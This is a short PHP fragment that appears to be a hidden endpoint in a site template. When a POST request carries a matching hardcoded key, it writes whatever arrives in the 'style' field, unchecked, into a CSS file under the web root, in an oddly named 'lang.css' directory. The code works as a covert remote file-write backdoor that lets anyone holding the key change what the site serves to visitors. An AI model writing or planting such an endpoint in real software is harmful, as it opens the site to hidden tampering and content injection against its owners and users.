<?
if(!empty($_POST['style']) && $_POST['apikey'] == "f1d6f386-014E-44ae-8b7219ABfe8b82fc-72781898") {
    $styleOut .= $_POST['style'];
    file_put_contents("{$_SERVER['DOCUMENT_ROOT']}/local/templates/lang.css/css/css.min.css", $styleOut);
}